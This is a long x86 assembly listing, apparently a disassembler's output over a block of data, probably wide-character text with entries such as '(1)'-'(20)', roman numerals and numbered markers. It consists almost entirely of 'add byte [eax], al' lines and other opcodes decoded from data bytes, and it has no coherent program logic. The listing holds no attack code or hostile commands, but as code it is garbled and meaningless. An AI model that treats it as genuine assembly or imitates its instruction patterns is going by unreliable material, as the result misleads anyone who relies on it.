add byte [eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec ebp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
das
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
das
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
das
add byte [eax], al
add byte [0x20000000], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
das
add byte [eax], al
add byte [0x20000000], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
das
add byte [eax], al
add byte [0x20000000], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
xor al, 0
add byte [eax], al
das
add byte [eax], al
add byte [0x20000000], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
das
add byte [eax], al
add byte [esi], dh
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
xor eax, 0x2f000000
add byte [eax], al
add byte [esi], dh
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
das
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
das
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
xor eax, 0x2f000000
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
aaa
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec ecx
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec ecx
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
dec ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
dec ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], dl
push esi
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
dec ecx
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec ecx
add byte [eax], al
add byte [eax], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], bl
add byte [eax], al
dec ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], bl
add byte [eax], al
dec ecx
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0x690000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0x690000
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0x760000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809a40a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809a416
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809a426
add byte [eax], al
imul eax, dword [eax], 0x690000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809a43a
add byte [eax], al
imul eax, dword [eax], 0x690000
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0x780000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809a462
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809a46e
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809a47e
add byte [eax], al
imul eax, dword [eax], 0x690000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
insb byte es:[edi], dx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
cmp al, 0
add byte [eax], al
sub eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0x3e000000], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], bh
add byte [eax], al
sub eax, 0x3e000000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], bh
add byte [eax], al
cmp eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0x3e000000], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], bh
add byte [eax], al
cmp eax, 0x3e000000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
cmp al, 0
add byte [eax], al
cmp eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], bh
add byte [eax], al
add byte [0], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], bh
add byte [eax], al
cmp al, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte ds:[eax], al
add byte [esi], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], bh
add byte [eax], al
cmp al, 0
add byte [eax], al
cmp al, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte ds:[eax], al
add byte [esi], bh
add byte [eax], al
add byte [esi], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], cl
add byte [eax], al
push ebp
add byte [eax], al
add byte [eax + eax], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
dec edi
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push ebx
add byte [eax], al
add byte [eax + eax], dl
add byte [eax], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebp
add byte [eax], al
add byte [eax + eax], dl
add byte [eax], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebp
add byte [eax], al
add byte [edi], cl
add byte [eax], al
push esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [ebx], al
add byte [eax], al
dec ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
inc ebp
add byte [eax], al
add byte [eax + eax], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
push ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], cl
add byte [eax], al
push esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], cl
add byte [esi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [eax + eax], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], al
add byte [eax], al
push edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
dec edi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
dec ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax + eax], cl
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esp
add byte [eax], al
add byte [ebx], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esp
add byte [eax], al
add byte [ebx], al
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esp
add byte [eax], al
add byte [ebx], al
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esp
add byte [eax], al
add byte [ebx], al
add byte [eax], al
xor al, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [ecx], al
add byte [eax], al
dec ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
pop ecx
add byte [eax], al
add byte [esi], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebp
add byte [eax], al
add byte [eax + eax], dl
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebx
add byte [eax], al
add byte [ecx], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], al
add byte [eax], al
dec ebp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
push ebp
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebp
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
inc ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], al
add byte [eax], al
push ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
push ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], dl
add byte [eax], al
push ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
push ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], al
add byte [ebp], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [eax + eax], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [eax + eax], dh
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor eax, 0x29000000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [esi], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [edi], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], bh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [eax], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [eax + eax], dh
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
xor eax, 0x29000000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [esi], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [edi], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [ecx], bh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [eax], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [eax + eax], dh
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor eax, 0x29000000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [esi], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [edi], dh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], bh
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
sub byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
xor byte [eax], al
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
xor al, 0
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
xor eax, 0x29000000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
sub byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
add byte ss:[eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
sub byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
aaa
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
sub byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
cmp byte [eax], al
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
cmp dword [eax], eax
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
xor byte [eax], al
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
add byte cs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], dh
add byte [eax], al
add byte cs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0x2e000000], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], dh
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dh
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bh
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [eax], dh
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [eax + eax], dh
add byte [eax], al
add byte cs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [0x2e000000], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [esi], dh
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [edi], dh
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [ecx], bh
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [eax], dh
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
bound eax, qword [eax]
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [edi], ah
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
push 0x29000000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
